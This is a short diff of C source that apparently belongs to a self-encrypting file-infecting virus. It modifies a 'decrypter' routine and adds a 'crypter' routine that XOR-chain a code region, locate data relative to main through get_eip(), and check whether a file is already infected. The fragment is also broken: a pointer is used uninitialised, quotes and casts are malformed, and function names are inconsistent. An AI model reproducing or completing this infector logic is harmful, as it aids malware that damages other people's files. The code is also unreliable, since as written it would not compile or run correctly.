@@ -34,16 +34,37 @@ void decrypter(void)
 	size_t	offset;
 	char	*start;
 
-	offset = *(int *)(address_of_main - 4 + sizeof(offset));
-	if(size && is_infected(address_of_main))
+	offset = *(int *)(&main + get_eip() - 4 + sizeof(offset));
+	size = *(int *)(&main + get_eip() - 4);
+	if(size && im_infected(&main + get_eip()))
 	{
-		start[offset] ^= *(int *)(address_of_main - 4);
+		start[offset] ^= *(int *)(&main + get_eip() - 4);
 		offset++;
-		size++;
 		while (offset < size)
 		{
 			start[offset] ^= start[offset - 1];
 			offset++;
+		}
+	}
+}
+
+void crypter(t_file file)
+{
+	size_t	size;
+	size_t	offset;
+	char	*start;
+
+	printf(“%p\n”,get_eip() - ((char )&yeah - (char )&crypter));
+	offset = *(int *)(&main + get_eip() - 4 + sizeof(offset));
+	size = *(int *)(&main + get_eip() - 4);
+	if(size && is_infected(file->data))
+	{
+		start[offset + size] ^= *(int *)(&main + get_eip() - 4);
+		size--;
+		while (size)
+		{
+			start[offset + size] ^= start[offset + size - 1];
+			size--;
 		}
 	}
 }
